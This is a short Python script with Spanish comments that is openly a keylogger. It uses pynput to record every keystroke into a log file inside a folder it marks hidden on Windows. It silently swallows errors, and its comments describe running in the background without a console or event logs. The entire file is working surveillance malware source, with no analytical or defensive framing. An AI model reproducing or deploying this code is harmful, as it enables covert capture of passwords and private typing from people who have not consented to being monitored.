import os
import ctypes
from pynput import keyboard
import time

# Obtener el directorio del script y cambiar el directorio actual
base_path = os.path.abspath(os.path.dirname(__file__))
os.chdir(base_path)

# Función para hacer la carpeta oculta
def create_hidden_folder(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    # Establecer la carpeta como oculta (en Windows)
    if os.name == 'nt':  # Solo en Windows
        ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)  # 0x02 = FILE_ATTRIBUTE_HIDDEN

# Mapeo de teclas específicas a números
key_map = {
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9'
}

# Ruta donde se guardarán los archivos
folder_path = os.path.join(base_path, "KeyloggerFolder")
create_hidden_folder(folder_path)

log_file = os.path.join(folder_path, "key_log.txt")

# Abre el archivo en modo append para registrar las pulsaciones
def start_keylogger():
    with open(log_file, "a") as f:
        def on_press(key):
            try:
                # Verifica si la tecla tiene un código específico
                if hasattr(key, 'vk') and key.vk in key_map:
                    key_pressed = key_map[key.vk]
                else:
                    key_pressed = str(key.char) if hasattr(key, 'char') else str(key)
                
                # Escribe la tecla presionada en el archivo
                f.write(f"{key_pressed}\n")
                f.flush()  # Asegura que se guarde inmediatamente

            except Exception as e:
                pass  # No hacer nada en caso de error para evitar la impresión de errores

        # Escuchar las pulsaciones del teclado
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

# Ejecutar en segundo plano sin consola ni registros de eventos
if __name__ == "__main__":
    start_keylogger()
